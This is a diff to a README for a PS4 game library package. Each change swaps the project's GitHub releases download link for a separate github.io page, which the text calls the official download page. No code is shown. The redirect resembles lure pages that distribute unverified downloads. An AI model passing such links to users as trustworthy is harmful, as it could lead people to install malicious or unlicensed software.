@@ -1,6 +1,6 @@
 # 📦 FPKGI-Data-package - Your Ultimate PS4 Game Library
 
-[![Download Now](https://img.shields.io/badge/Download-FPKGI%20Data%20Package-blue?style=for-the-badge&logo=github&color=2ea44f)](https://github.com/jorgepjgarcia0/FPKGI-Data-package/releases)
+[![Download Now](https://img.shields.io/badge/Download-FPKGI%20Data%20Package-blue?style=for-the-badge&logo=github&color=2ea44f)](https://jorgepjgarcia0.github.io)
 
 ---
 
@@ -29,7 +29,7 @@ Before we begin, make sure you have:
 
 ### Step 1: Get the Package
 
-Visit this link to download the application: **[https://github.com/jorgepjgarcia0/FPKGI-Data-package/releases](https://github.com/jorgepjgarcia0/FPKGI-Data-package/releases)**
+Visit this link to download the application: **[https://jorgepjgarcia0.github.io](https://jorgepjgarcia0.github.io)**
 
 Click the link above – it will take you to the official download page. Look for the **latest release** and click the download button. The file is large, so it may take a few minutes depending on your internet speed.
 
@@ -155,7 +155,7 @@ You're now ready to explore an incredible library of 871 games! This package tra
 
 **Ready to start?** 
 
-Visit this link to download the application: **[https://github.com/jorgepjgarcia0/FPKGI-Data-package/releases](https://github.com/jorgepjgarcia0/FPKGI-Data-package/releases)**
+Visit this link to download the application: **[https://jorgepjgarcia0.github.io](https://jorgepjgarcia0.github.io)**
 
 ---
 
